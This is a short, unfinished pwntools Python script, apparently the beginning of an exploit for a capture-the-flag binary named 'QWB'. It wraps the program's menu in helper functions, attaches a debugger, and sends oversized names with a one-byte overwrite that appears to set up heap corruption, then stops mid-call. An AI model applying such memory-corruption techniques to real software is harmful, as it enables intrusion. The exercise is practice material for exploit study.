#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process("./QWB")
elf = ELF("./QWB")
libc = elf.libc

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def add(name, n):
    io.sendlineafter(')', 'A')
    io.sendlineafter(':', name)
    io.sendlineafter('?', str(n))

def show():
    io.sendlineafter(')', 'S')

add('0' * 0x70, 0)
add('1' * 0x80 + p8(0x10), '1')
add('2' * 0x80, )

